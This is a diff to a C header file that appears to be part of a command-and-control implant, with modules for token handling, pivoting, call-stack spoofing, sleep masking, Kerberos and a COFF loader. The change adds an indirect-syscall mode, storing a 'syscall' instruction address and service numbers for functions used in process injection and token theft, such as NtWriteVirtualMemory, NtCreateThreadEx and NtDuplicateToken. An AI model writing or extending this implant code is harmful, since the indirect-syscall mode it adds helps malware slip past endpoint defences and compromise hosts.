@@ -11,7 +11,7 @@
 #include <Common/Macros.h>
 #include <Common/Clr.h>
 
-#include <Core/WinUtils.h>
+#include <Core/Win32.h>
 #include <Core/Token.h>
 #include <Core/Pivot.h>
 #include <Core/Spoof.h>
@@ -21,6 +21,8 @@
 #include <Core/Transport.h>
 #include <Core/Socket.h>
 #include <Core/Kerberos.h>
+#include <Core/Syscalls.h>
+#include <Core/SysNative.h>
 
 #include <Loader/CoffeeLdr.h>
 
@@ -108,6 +110,7 @@ typedef struct
         struct {
             DWORD SleepMaskTechnique;
             BOOL  StackSpoof;
+            BOOL  SysIndirect;
             BOOL  Verbose;
             PVOID ThreadStartAddr;
             BOOL  CoffeeThreaded;
@@ -167,10 +170,38 @@ typedef struct
 
         WIN_FUNC( NtClose );
         WIN_FUNC( NtSetEvent );
-        WIN_FUNC( NtCreateEvent );
         WIN_FUNC( NtSetInformationThread );
         WIN_FUNC( NtSetInformationVirtualMemory );
         WIN_FUNC( NtGetNextThread );
+        WIN_FUNC( NtOpenThread )
+        WIN_FUNC( NtOpenProcess )
+        WIN_FUNC( NtOpenProcessToken )
+        WIN_FUNC( NtDuplicateToken )
+        WIN_FUNC( NtQueueApcThread )
+        WIN_FUNC( NtSuspendThread )
+        WIN_FUNC( NtResumeThread )
+        WIN_FUNC( NtCreateEvent )
+        WIN_FUNC( NtCreateThreadEx )
+        WIN_FUNC( NtDuplicateObject )
+        WIN_FUNC( NtGetContextThread )
+        WIN_FUNC( NtSetContextThread )
+        WIN_FUNC( NtQueryInformationProcess )
+        WIN_FUNC( NtQuerySystemInformation )
+        WIN_FUNC( NtWaitForSingleObject )
+        WIN_FUNC( NtTestAlert )
+        WIN_FUNC( NtAllocateVirtualMemory )
+        WIN_FUNC( NtWriteVirtualMemory )
+        WIN_FUNC( NtReadVirtualMemory )
+        WIN_FUNC( NtFreeVirtualMemory )
+        WIN_FUNC( NtProtectVirtualMemory )
+        WIN_FUNC( NtTerminateThread )
+        WIN_FUNC( NtContinue )
+        WIN_FUNC( NtAlertResumeThread )
+        WIN_FUNC( NtSignalAndWaitForSingleObject )
+        WIN_FUNC( NtQueryVirtualMemory )
+        WIN_FUNC( NtQueryInformationToken )
+        WIN_FUNC( NtQueryInformationThread )
+        WIN_FUNC( NtQueryObject )
 
         // Kernel32
         WIN_FUNC( CreateRemoteThread )
@@ -224,7 +255,7 @@ typedef struct
         WIN_FUNC( GetLocalTime )
         WIN_FUNC( DuplicateHandle )
 
-        // WinHTTP
+        /* WinHttp.dll */
         WIN_FUNC( WinHttpOpen )
         WIN_FUNC( WinHttpConnect )
         WIN_FUNC( WinHttpOpenRequest )
@@ -361,6 +392,8 @@ typedef struct
 
     struct
     {
+#undef OBF_SYSCALL
+#ifdef OBF_SYSCALL
         WIN_FUNC( NtOpenFile )
         WIN_FUNC( NtOpenThread )
         WIN_FUNC( NtOpenProcess )
@@ -385,7 +418,6 @@ typedef struct
         WIN_FUNC( NtReadVirtualMemory )
         WIN_FUNC( NtFreeVirtualMemory )
         WIN_FUNC( NtProtectVirtualMemory )
-        WIN_FUNC( NtFlushInstructionCache )
         WIN_FUNC( NtTerminateThread )
         WIN_FUNC( NtContinue )
         WIN_FUNC( NtAlertResumeThread )
@@ -394,6 +426,43 @@ typedef struct
         WIN_FUNC( NtQueryInformationToken )
         WIN_FUNC( NtQueryInformationThread )
         WIN_FUNC( NtQueryObject )
+#else
+        PVOID SysAddress; /* 'syscall' instruction pointer */
+
+        /* Syscall Service Numbers */
+        WORD NtOpenThread;
+        WORD NtOpenProcess;
+        WORD NtOpenProcessToken;
+        WORD NtDuplicateToken;
+        WORD NtQueueApcThread;
+        WORD NtSuspendThread;
+        WORD NtResumeThread;
+        WORD NtCreateEvent;
+        WORD NtCreateThreadEx;
+        WORD NtDuplicateObject;
+        WORD NtGetContextThread;
+        WORD NtSetContextThread;
+        WORD NtQueryInformationProcess;
+        WORD NtQuerySystemInformation;
+        WORD NtWaitForSingleObject;
+        WORD NtAllocateVirtualMemory;
+        WORD NtWriteVirtualMemory;
+        WORD NtReadVirtualMemory;
+        WORD NtFreeVirtualMemory;
+        WORD NtProtectVirtualMemory;
+        WORD NtTerminateThread;
+        WORD NtAlertResumeThread;
+        WORD NtSignalAndWaitForSingleObject;
+        WORD NtQueryVirtualMemory;
+        WORD NtQueryInformationToken;
+        WORD NtQueryInformationThread;
+        WORD NtQueryObject;
+        WORD NtClose;
+        WORD NtSetEvent;
+        WORD NtSetInformationThread;
+        WORD NtSetInformationVirtualMemory;
+        WORD NtGetNextThread;
+#endif
     } Syscall;
 
     struct
